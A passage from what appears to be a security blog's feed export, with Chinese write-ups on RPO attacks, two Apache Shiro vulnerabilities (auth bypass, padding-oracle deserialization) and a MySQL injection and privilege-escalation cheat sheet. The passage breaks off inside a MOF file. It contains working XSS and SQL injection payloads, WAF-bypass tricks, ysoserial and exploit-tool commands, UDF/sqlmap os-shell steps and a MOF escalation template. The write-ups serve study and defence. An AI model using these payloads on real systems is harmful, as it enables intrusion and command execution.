    <content><![CDATA[<p>RPO(Relative Path Overwrite)是一种<font color=#008000>基于服务器的web缓存技术和配置差异，利用服务器与浏览器对URL解析的差异，将页面中使用相对路径引入的静态资源文件解析成其他资源文件/可控内容的页面</font>，从而使用可控的方式(js)来处理服务器的响应内容，导致XSS、信息泄漏的产生的新型攻击技术。此外，服务器与浏览器对URL解析的差异也是开放重定向漏洞的一个成因。</p>
<a id="more"></a>


<h1 id="攻击前提"><a href="#攻击前提" class="headerlink" title="攻击前提"></a>攻击前提</h1><ul>
<li>服务器与浏览器对URL解析的差异</li>
<li>存在相对路径的js或者css的引用</li>
</ul>
<h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h1><p>首先需要知道的一点是浏览器对%2f是不会解析的。然后就是服务端的解析情况。</p>
<ul>
<li>Apache在开启<code>AllowEncodedSlashes</code>这个选项时，会对URL中的%2f进行解码。(默认不开启)</li>
<li>nginx默认会对URL中的%2f进行解码。  </li>
</ul>
<p>url会存在以下几种模式。</p>
<h3 id="普通模式"><a href="#普通模式" class="headerlink" title="普通模式"></a>普通模式</h3><p><code>http://localhost/index.php?m=Index&amp;a=test</code></p>
<p>那么对于传入的url为<code>/A/B/..%2f.index.php</code>来说，服务器端会定位到<code>/A/index.php</code>，而浏览器获得的相对路径为<code>/A/B/</code>。因此，当在<code>/A/index.php</code>页面中存在相对资源的引用时，本应该引入的/A/xxx.js，却引入了/A/B/xxx.js。当/A/B/目录下的资源可控时，就能造成xss等漏洞。</p>
<blockquote>
<p>这样的攻击方式利用条件比较严苛，需要对静态资源可控。</p>
</blockquote>
<h3 id="pathinfo模式"><a href="#pathinfo模式" class="headerlink" title="pathinfo模式"></a>pathinfo模式</h3><p>PHP的path_info模式，如下面所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;模块&#x2F;方法</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;Index&#x2F;test</span><br></pre></td></tr></table></figure>
<p>这样的方式，存在的安全问题就是后端服务器会将拼接的不存在的路径当作一个参数，实际上会返回错误路径前正确路径的内容。</p>
<h2 id="url-rewrite模式"><a href="#url-rewrite模式" class="headerlink" title="url_rewrite模式"></a>url_rewrite模式</h2><p>当服务器端进行了路由美化(使用了url_rewrite的php框架，python web框架)，比如REST风格的API，<code>http://ip:port/rpo/user/id/1</code>。其中1为id参数的值，该请求的接口实际为<code>/rpo/user/</code>。那么当请求为<code>/rpo/user/id/1/test</code>，后端会识别出&lt;id,1&gt;这一对参数值，然后的识别为&lt;test,’’&gt;，因此会返回&lt;id,1&gt;的内容。但是浏览器客户端会认为id是目录，从而加载了<code>/rpo/user/id/</code>路径下的静态资源。</p>
<blockquote>
<p>浏览器在解析CSS样式时，会忽略非法的部分，直到找到正确的开始然后进行解析一直到结束。可以输入payload为CSS的XSS向量。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#header &#123;background:url(javascript:alert(‘1’));&#125;</span><br><span class="line">&#123;&#125;*&#123;x:expression(alert(1))&#125;</span><br></pre></td></tr></table></figure>


<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><ul>
<li>参考2018年强网杯。<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1></li>
<li><a href="https://www.smi1e.top/%E6%B5%85%E8%B0%88rpo%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">浅谈RPO攻击</a></li>
<li><a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="noopener">【技术分析】RPO攻击技术浅析</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>CVE-2020-1957 Shiro权限绕过漏洞分析</title>
    <url>/2020/05/24/shiro-682/</url>
    <content><![CDATA[<p>该漏洞源自于shiro-682问题。即在spring框架下uri = uri + ‘/‘绕过shiro防护的问题。在shiro1.5.0版本进行修复。然而修复后的仍然可被绕过。这篇文章深入分析了Shiro这一漏洞。</p>
<a id="more"></a>

<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>shiro &lt;= 1.5.1</li>
</ul>
<p>这次从shiro-682开始介绍。</p>
<h2 id="Shiro-682"><a href="#Shiro-682" class="headerlink" title="Shiro 682"></a>Shiro 682</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>shiro &lt; 1.5.0</li>
</ul>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在Spring web项目中，请求的URI如<code>/resource/menus</code>和<code>/resource/menus/</code>都可以访问到服务器的资源。但是Shiro中的URL路径表达式只能正确匹配到<code>/resource/menus</code>，而无法正确匹配到<code>/resource/menus/</code>，导致无法匹配进入到过滤链，从而绕过了Shiro的防护机制。</p>
<p>定位到<code>PathMatchingFilterChainResolver#getChain</code>函数。改函数作用即根据URL路径匹配中配置的URI路径表达式来匹配输入的URI，判断是否匹配拦截器，匹配成功将会返回响应的拦截器执行链，从而进入ShiroFilter执行。</p>
<p><img src="1.png" alt=""></p>
<p>跟进pathMatches函数，一直到<code>AntPathMatcher#doMatch</code>函数。</p>
<p><img src="2.png" alt=""></p>
<p><img src="3.png" alt=""></p>
<p>可以看到在这段逻辑中，当pattern为<code>/hello/*</code>，path为<code>/hello/1/</code>时，先从前往后进行匹配，到匹配<code>*</code>与<code>1</code>就结束了，然后接着往下走，从后往前匹配，这时候很显然匹配失败，因此不进入ShiroFilter链。</p>
<h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><p><img src="4.png" alt=""><br>从该补丁可以看出，当请求的URI以<code>/</code>结尾时，先去掉<code>/</code>再进行匹配。</p>
<h2 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h2><h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>shiro &lt;= 1.5.1</li>
</ul>
<h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>前面在shiro 1.5.0版本中已经修复了在后面加上<code>/</code>的绕过方式。而此次的绕过方式还是在<code>PathMatchingFilterChainResolver#getChain</code>函数中。</p>
<p><img src="5.png" alt=""></p>
<p>跟进getPathWithinApplication函数中。</p>
<p><img src="6.png" alt=""></p>
<p>调用getRequestUri()函数，进而调用decodeAndcleanUriString对uri进行清理。跟进它</p>
<p><img src="7.png" alt=""></p>
<p>在这里它会判断URI中是否含有<code>;</code>，若含有则，截取<code>;</code>之前的值作为URL。因此，对于<code>/xxx;/hello/1</code>，Shiro截取的结果为<code>/xxx</code>，从而匹配不成功。但是在spring中却直接获取到了后面的URI，从而绕过鉴权。</p>
<h3 id="补丁-1"><a href="#补丁-1" class="headerlink" title="补丁"></a>补丁</h3><p><img src="8.png" alt=""></p>
<p>在1.5.2版本中，将获取URI的方式从<code>request.getRequestURI</code>直接获取的方式改成获取request的<code>ContextPath</code>，<code>ServletPath</code>，<code>PathInfo</code>，然后再重新拼接而成。<br>对于<code>/xxx;/hello/1</code>，<code>ContextPath</code>，<code>ServletPath</code>，<code>PathInfo</code>分别为空，<code>/hello/1</code>，<code>/1</code>。拼接而成<code>//hello/1/1</code>。从而无法绕过了。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>此漏洞的成因主要是由于Shiro与Spring(Servlet)的拦截器对于URI模式匹配的差异，从而导致绕过。此外，还有undertow中的Filter与Controller对于URL解析不一致，从而可以通过/..;/绕过鉴权。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://issues.apache.org/jira/browse/SHIRO-682" target="_blank" rel="noopener">SHIRO-682 fix the potential threat when use “uri = uri + ‘/‘ “ to bypassed shiro protect</a></li>
<li><a href="https://www.freebuf.com/vuls/231909.html" target="_blank" rel="noopener">Shiro权限绕过漏洞分析（CVE-2020-1957）</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro-721 Padding Oracle漏洞分析复现</title>
    <url>/2020/05/09/shiro-721/</url>
    <content><![CDATA[<p>shiro在经历了1.2.4硬编码密钥导致的反序列化漏洞之后，又被爆出新的RCE漏洞，还是在AES这个地方，编号为shiro-550。这篇文章复现并分析了该漏洞。</p>
<a id="more"></a>

<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>shiro &lt;= 1.4.1</li>
</ul>
<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul>
<li>具有合法cookie值</li>
<li>能够对padding正确与否做出不同的响应</li>
</ul>
<h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><ul>
<li>rememberMe</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Shrio所使用的cookie里的rememberMe字段采用了AES-128-CBC的加密模式，这使得该字段可以被Padding oracle攻击利用。攻击者可以使用一个合法有效的rememberMe cookie作为前缀来实施Padding Oracle，然后制造一个特定的rememberMe来执行Java反序列化攻击。  </p>
<p>复现的步骤如下:  </p>
<ul>
<li>成功登录网站并获取到rememberMe Cookie</li>
<li>使用这个合法Cookie作为前缀来进行Padding Oracle攻击</li>
<li>加密ysoserial反序列化payload来制作特定的rememberMe cookie</li>
<li>使用新的rememberMe cookie发起请求。</li>
</ul>
<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>大多数的Padding Oracle攻击都是用来获取明文的，后来提出了利用Padding Oracle加密任意明文的方法，其原理可从<a href="https://ananaskr.github.io/2020/05/08/padding-oracle/" target="_blank" rel="noopener">前面</a>文章中获取。要想利用此漏洞，有一个很关键的条件，目标系统需要对AES解密时padding正确与否，返回明确的信息，有点类似布尔盲注。</p>
<p>这次漏洞点和<a href="https://ananaskr.github.io/2020/05/08/shiro-550-attack/" target="_blank" rel="noopener">shiro-550</a>一样，还是出在了AES这个地方。让我们来跟进一下，是否满足AES解密padding正确与否时返回不同的信息。选择shiro的1.4.1版本。</p>
<p>首先确定一下AES解密失败padding的返回值。还是定位到<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code>方法，从这里一直到解密crypt函数，所经过的调用链如下图所示:</p>
<p><img src="2.png" alt=""></p>
<p>crypt函数中的处理如下所示：</p>
<p><img src="1.png" alt=""></p>
<p>如果解密cipher.dpFinal失败就会抛出异常，这个异常往上最终会被getRememberedPrincipals中捕获并进行处理。如下图所示:</p>
<p><img src="3.png" alt=""></p>
<p>会进入onRememberedPrincipalFailure函数进行处理，跟进它。</p>
<p><img src="4.png" alt=""></p>
<p>在此函数中获取到request和response，然后跟进forgetIdentity函数，</p>
<p><img src="5.png" alt=""></p>
<p>在forgetIdentity函数中将当前cookie值从request、response中删除。</p>
<p><img src="6.png" alt=""></p>
<p>跟进removeFrom函数可以看到，将cookie的rememeberMe字段值设置为deleteMe。</p>
<p><img src="7.png" alt=""></p>
<p>从上述分析中可以得知，当padding错误时，返回的cookie值是deleteMe。</p>
<p>然而到这里就结束了吗？并没有，如果走一遍流程就会发现，当反序列化发生错误时，最终也是调用到了removeFrom函数。因为convertBytesToPrincipals中也包含反序列化的操作。现在的情况就变成了:</p>
<ul>
<li>padding正确、反序列化正确 =&gt; rememberMe</li>
<li>padding正确、反序列化错误 =&gt; deleteMe</li>
<li>padding错误、反序列化正确 =&gt; deleteMe</li>
<li>padding错误、反序列化错误 =&gt; deleteMe</li>
</ul>
<p>为了消除反序列化错误对其的影响，每次请求的数据必须是能够正确反序列化的。本身padding oracle攻击并不需要一个合法有效的密文，但是在shiro场景下，为了能够正确反序列化，需要一个<font color=#008000>合法有效的cookie</font>。</p>
<p>在这里用到了一个java反序列化中的小trick，java中的ObjectOutputStream是一个stream，它会按照格式以队列的方式读下去，若后面拼接无关内容，是不会影响反序列化的。因此，在后面添加新的IV和密文，既能反序列化成功，又能验证padding是否正确。</p>
<blockquote>
<p>shiro接口在验证登录时有authc和user两种权限，authc是认证过，user是登录过。若开启了rememberMe功能，user可以通过，而authc不能通过。因此rememberMe只有在user权限的接口才有用。可以参考<a href="https://xz.aliyun.com/t/7207#toc-3" target="_blank" rel="noopener">Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC</a>。</p>
</blockquote>
<p>接下来的就是编写exp，然后进行padding oracle。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>进行漏洞利用时，环境选择shiro 1.4.1版本。</p>
<h2 id="获取明文"><a href="#获取明文" class="headerlink" title="获取明文"></a>获取明文</h2><p>首先获取要构造的明文。一段反序列化后能够执行命令的字节码。前面的文章介绍了wh1t3p1g师傅使用的一种方式，这次介绍另一种利用链构造方式，利用到了<font color=#008000>commons-beanutils</font>。同样地为了保持不受数组的影响，采用的命令执行点仍然是TemplatesImpl对象。只不过不再使用TransformingComparator而是<font color=#008000>BeanComparator</font>。这就是ysoserial中的<font color=#008000>CommonsBeanUtils1</font>。关于此利用链的分析可以从<a href="https://ananaskr.github.io/2020/05/09/ysoseial-commonsbeanutils1/" target="_blank" rel="noopener">ysoseial之CommonsBeanUtils1分析</a>中获取。</p>
<p>利用ysoseial首先生成所需要的明文</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 &#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator &gt; payload.bin</span><br></pre></td></tr></table></figure>

<h2 id="获取密文"><a href="#获取密文" class="headerlink" title="获取密文"></a>获取密文</h2><p>然后在网上找了一个脚本<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721" target="_blank" rel="noopener">PaddingOracleAttack-Shiro-721</a>进行利用。执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</span><br></pre></td></tr></table></figure>

<p>在实际中，执行了以下命令。</p>
<p><img src="8.png" alt=""></p>
<p>生成的密文结果如下:</p>
<p><img src="9.png" alt=""></p>
<p>然后将其作为新的rememberMe Cookie值，发送请求，结果如下</p>
<p><img src="10.png" alt=""></p>
<blockquote>
<p>在实际利用时，尽量选择简短的payload，这样有利于缩减爆破的时间。</p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://issues.apache.org/jira/browse/SHIRO-721" target="_blank" rel="noopener">RememberMe Padding Oracle Vulnerability</a></li>
<li><a href="https://xz.aliyun.com/t/7026" target="_blank" rel="noopener">Apacha-Shiro PaddingOracle 分析</a></li>
<li><a href="https://p0sec.net/index.php/archives/126/" target="_blank" rel="noopener">Shiro Padding Oracle Attack 反序列化</a></li>
<li><a href="https://xz.aliyun.com/t/7207#toc-3" target="_blank" rel="noopener">Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql安全总结</title>
    <url>/2020/08/01/sql-security/</url>
    <content><![CDATA[<p>终于找到一个空闲的时间，可以把Mysql这块的内容好好地整理、总结一番了，也是给自己理一下思路。这篇文章总结了Mysql注入、提权以及Mysql的一些其他攻击。</p>
<a id="more"></a>

<h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>sql注入是web应用程序对于用户输入没有进行足够的安全检查，使得输入的sql语句直接拼接到事先定义的语句中，使得其被执行。</p>
<h2 id="判断SQL注入"><a href="#判断SQL注入" class="headerlink" title="判断SQL注入"></a>判断SQL注入</h2><p>一般而言，有以下几种方式</p>
<ul>
<li><code>&#39; ``&quot;``\</code>使其产生报错</li>
<li><code>and 1=1</code>/<code>and 1=2</code>对比页面内容</li>
<li><code>and sleep(5)</code>对比响应时间</li>
</ul>
<h2 id="按注入类型"><a href="#按注入类型" class="headerlink" title="按注入类型"></a>按注入类型</h2><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>联合查询指的就是最普通的那种在select的where语句后面直接拼接union的方式。</p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注的出现是在无法通过页面的回显来直接获取到数据时，通过侧信道的方式来获取。这种方式需要一个差异，包括响应时间的差异和页面返回结果的差异。因此在sql语句中需要构造布尔表达式，使得布尔表达式的真假影响语句执行结果。</p>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul>
<li>sleep()</li>
<li>benchmark()</li>
<li>笛卡尔积<ul>
<li>选择一个大的表来做笛卡尔积<br><code>SELECT count(*) FROM information_schema.columns A, information_schema.columns B;</code>    </li>
</ul>
</li>
<li>get_lock()<ul>
<li>利用有限</li>
</ul>
</li>
<li>正则bug</li>
</ul>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入在sql注入中是一种很常见的注入方式。此种利用方式需要页面将报错信息回显出来。</p>
<ul>
<li>溢出报错<ul>
<li>exp()<br><code>exp(~(select * from (select user())x))</code></li>
</ul>
</li>
<li>xpath语法报错(mysql &gt;= 5.1.5)<ul>
<li>etractvalue<br><code>select extractvalue(1,concat(0x7e,(select @@version),0x7e));</code></li>
<li>updatexml<br><code>select updatexml(1,concat(0x7e,(select @@version),0x7e));</code></li>
</ul>
</li>
<li>主键重复报错<ul>
<li>count()和group by遇到rand()产生重复值时报错<br><code>select count(*) from group by concat(version(),floor(rand(0)*2));</code> </li>
</ul>
</li>
<li>列名重复报错<ul>
<li>join<br><code>select * from (select * from test a join test b)c</code></li>
</ul>
</li>
<li>几何函数报错<ul>
<li>geometrycollection()</li>
<li>multipoint()<br><code>select multipoint((select * from (select * from (select version())a)b));</code></li>
<li>ploygon()</li>
<li>multipolygon()</li>
<li>linestring()</li>
<li>multilinestring() </li>
</ul>
</li>
<li>GTID函数报错<ul>
<li>GTID_SUBSET()</li>
<li>GTID_SUBTRACT()</li>
</ul>
</li>
</ul>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节注入主要是源于数据库编码与应用程序的编码设置不同所导致的。更具体一点来说是，mysql数据库中设置了GBK编码，会认为两个字符是一个汉字，从而在转义符前加入一个ASCII大于128的字符，将转义符吃掉，从而保留了单引号。  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%5c%27 &#x3D;&gt; \&#39; </span><br><span class="line">%df%5c%%27 &#x3D;&gt; 汉字&#39;</span><br></pre></td></tr></table></figure>

<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>大多数的网站都会对用户输入的语句进行特殊符号的转义，由于存入数据库的仍然是未转义的字符，若存在某个地方直接从数据库中取出存入的数据且未做检查，则会造成二次注入。</p>
<blockquote>
<p>题目可参考sqli_libs的第24关  </p>
</blockquote>
<h3 id="mysql约束攻击"><a href="#mysql约束攻击" class="headerlink" title="mysql约束攻击"></a>mysql约束攻击</h3><p>约束攻击经常出现的点是在用户注册处.利用mysql的select查询进行字符串比较时，不同长度的字符串，会用空格填充到相同字符再比较。mysql插入数据时，当数据超过定义的长度会出现截断现象。</p>
<h2 id="按照注入点"><a href="#按照注入点" class="headerlink" title="按照注入点"></a>按照注入点</h2><h3 id="select注入"><a href="#select注入" class="headerlink" title="select注入"></a>select注入</h3><p>对于select语句的注入，注入点通常在where语句后面，通常是结合union一起完成注入。</p>
<h3 id="insert注入、update注入"><a href="#insert注入、update注入" class="headerlink" title="insert注入、update注入"></a>insert注入、update注入</h3><p>insert类型的注入一般注入点在values函数里面。  </p>
<ul>
<li>有回显<ul>
<li>采用按位<code>|</code>按位<code>^</code>获取数据<br><code>insert into table values (0|(select hex(database())),&#39;test&#39;);</code><br><code>insert into table values (&#39;0&#39;|(select database()),&#39;test&#39;);</code></li>
</ul>
</li>
<li>盲注<br>  <code>insert into table values (1 xor sleep(2),&#39;test&#39;);</code><br>  <code>insert into table values (&#39;0&#39;&amp;sleep(2),&#39;test&#39;);</code> </li>
<li>无回显且无法盲注<ul>
<li>DNSLog    </li>
</ul>
</li>
</ul>
<blockquote>
<p>数据库的严格模式下，不能将整数型转为string型。</p>
</blockquote>
<h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h3><p>order by注入的一个重点是它后面几可以填一个列名，也可以填一个数字。它一般用于<code>报错注入</code>和<code>盲注</code>。</p>
<ul>
<li><p>报错注入</p>
<ul>
<li>updatexml<br><code>select * from ha order by updatexml(1,if(1=1,1,user()),1);</code></li>
<li>extractvalue<br><code>select * from ha order by extractvalue(1,if(1=1,1,user()));</code></li>
</ul>
</li>
<li><p>盲注</p>
<ul>
<li>与union语句联合使用时，可利用order by注入来盲注出某一字断的值。将字段值与填入的字符串一位一位比较。<br><code>union select 1,2,&#39;string&#39; order by 3</code></li>
<li>if()。根据不同列名，结果不一样<br><code>if(1=1,id,username)</code>需要知道列名<br><code>if(expr,1,(select id from information_schema.tables))</code>不需要列名</li>
<li>时间盲注<br><code>if(1=1,1,sleep(1))</code></li>
<li>rand()。<br><code>order by rand(true)/rand(false)</code><br><code>order by rand(ascii(mid((select database()),1,1))&gt;96)</code></li>
</ul>
</li>
</ul>
<h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h3><p>limit后面可以跟两个函数PROCEDURE和INTO。PROCEDURE里面的报错函数只能使用extractvalue，延时函数只能使用benchmark。</p>
<ul>
<li>PROCEDURE (5.0.0&lt;Mysql &lt;5.6.6)<br>  <code>SELECT name FROM users WHERE id &gt;0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(extractvalue(rand(),concat(0x3a,version())),1);</code><br>  <code>SELECT name FROM users WHERE id &gt;0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></li>
</ul>
<blockquote>
<p>1) 新版mysql不支持在analyse里面使用select;2)使用时间盲注时，不能直接使用sleep()，需要使用BENCHMARK代替。    </p>
</blockquote>
<ul>
<li>INTO (需要有写权限)<br>  <code>SELECT name FROM users WHERE id &gt;0 ORDER BY id LIMIT 1,1 INTO outfile/dumpfile &#39;xxx&#39;;</code> </li>
</ul>
<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><ol>
<li><p><strong>逗号</strong></p>
<ol>
<li>在字符串截取mid()这样的函数中，使用from 1 for 1.<code>mid(version(),1,1) =&gt;</code></li>
<li>limit处的逗号. <code>limit 1,1 =&gt; limit 1 offset 1</code> </li>
<li>union处的逗号. <code>join</code></li>
</ol>
</li>
<li><p><strong>空格</strong></p>
<ol>
<li>多层括号嵌套</li>
<li>使用注释/**/</li>
<li>使用不可见字符(%0a,%0b,%0d,%a0,%09)</li>
<li><code>and!!!!~~1=1</code></li>
<li>科学计数法0e绕过 <code>userid=0e1union</code></li>
</ol>
</li>
<li><p><strong>括号</strong></p>
<ol>
<li>order by 大小比较盲注 </li>
</ol>
</li>
<li><p><strong>特殊函数</strong></p>
<ol>
<li>字符串截取函数<ol>
<li>left(str,index)</li>
<li>right(str,index)</li>
<li>substr(str,index)</li>
<li>substring(str,index,len)</li>
<li>mid(str,index,len)  </li>
</ol>
</li>
<li>字符串比较<ol>
<li>strcmp(expr1,expr2)</li>
<li>find_in_set(str,strlist)  </li>
<li>if()</li>
</ol>
</li>
<li>字符转换函数<ol>
<li>hex()</li>
<li>bin()</li>
<li>ord()</li>
<li>ascii() </li>
</ol>
</li>
<li>字符串连接函数<ol>
<li>concat()</li>
<li>concat_ws()</li>
<li>group_concat()</li>
<li>lpad()</li>
<li>rpad()</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="敏感字符过滤"><a href="#敏感字符过滤" class="headerlink" title="敏感字符过滤"></a>敏感字符过滤</h3><ol>
<li>编码</li>
<li>双写绕过 (未进行递归过滤)</li>
<li>大小写绕过</li>
<li>运算符</li>
</ol>
<h3 id="单引号被转义"><a href="#单引号被转义" class="headerlink" title="单引号被转义"></a>单引号被转义</h3><ul>
<li>宽字节注入</li>
<li>编码，字符串可用十六进制表示</li>
</ul>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ul>
<li>预编译。预编译的作用有两个。<ul>
<li>提高执行速度。</li>
<li>预防sql注入。预防绝大部分的SQL注入。因为order by后面的语句不能用预编译。若模版可控，也会SQL注入。</li>
<li>mysql的预编译是将此类SQL语句中的值用占位符替代，可以说是将SQL语句参数化/模版化。</li>
</ul>
</li>
<li>黑名单/白名单</li>
<li>特殊字符转义</li>
<li>关闭错误提示</li>
<li>统一编码</li>
<li>使用数据库严格模式，防止截断</li>
</ul>
<h2 id="版本区别"><a href="#版本区别" class="headerlink" title="版本区别"></a>版本区别</h2><h3 id="5-0以上与5-0以下版本的区别"><a href="#5-0以上与5-0以下版本的区别" class="headerlink" title="5.0以上与5.0以下版本的区别"></a>5.0以上与5.0以下版本的区别</h3><ul>
<li>5.0以上版本存在有information_schema表</li>
</ul>
<h1 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h1><p>Mysql提权是指在已经获得mysql的root用户权限下，对其他目录具有写权限的情况下，将<code>mysql数据库操作权限</code>提升为<code>mysql进程系统命令执行权限</code>。</p>
<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>UDF提权即user defined function(用户自定义函数)，通过添加新函数，对MYSQL的功能进行扩充，后续就可以像使用concat()这样的内置方法来使用添加的新函数。  </p>
<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul>
<li>mysql &gt; 5.1<ul>
<li>dll/so文件必须放置在mysql安装目录的libplugin文件夹下</li>
</ul>
</li>
</ul>
<h3 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h3><ul>
<li><p>获取udf文件。sqlmap以及metasploit里面都有，根据操作系统版本、位数划分。</p>
</li>
<li><p>将udf文件放入指定的位置。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database udf;</span><br><span class="line">create table udfdump(c blob);</span><br><span class="line">insert into udfdump values(unhex(xxxxx));</span><br><span class="line">select c from udfdump into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;test.so&#39;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Mysql大于5.1时，需放置在Mysql根目录的lib/plugin文件夹下。可通过在数据库中执行以下语句查看。<code>select @@plugin_dir;</code></p>
</blockquote>
<ul>
<li>从udf文件中引入自定义函数。</li>
</ul>
<p><code>CREATE FUNCTION sys_eval() RETURNS STRING SONAME &#39;udf.dll&#39;</code></p>
<ul>
<li>执行自定义函数 </li>
</ul>
<p><code>SELECT sys_eval(&#39;id&#39;)</code></p>
<h3 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h3><ul>
<li>sqlmap</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -d &#39;mysql:&#x2F;&#x2F;root:root@192.168.0.32:3306&#x2F;mysql&#39; --os-shell</span><br></pre></td></tr></table></figure>

<ul>
<li>metasploit</li>
</ul>
<h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><p>mof是windows的托管对象格式，提权是利用了<font color=#008000><code>c:/windows/system32/wbem/mof/nullevt.mof</code>文件每分钟都会在一个特定的时间去执行一次的特性。</font>通过将cmd命令写入该mof文件，从而被执行。</p>
<blockquote>
<p>针对于低版本的系统进行提权。</p>
</blockquote>
<h3 id="提权过程-1"><a href="#提权过程-1" class="headerlink" title="提权过程"></a>提权过程</h3><ul>
<li>获取mof文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\.\root\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name  &#x3D; &quot;filtP2&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span 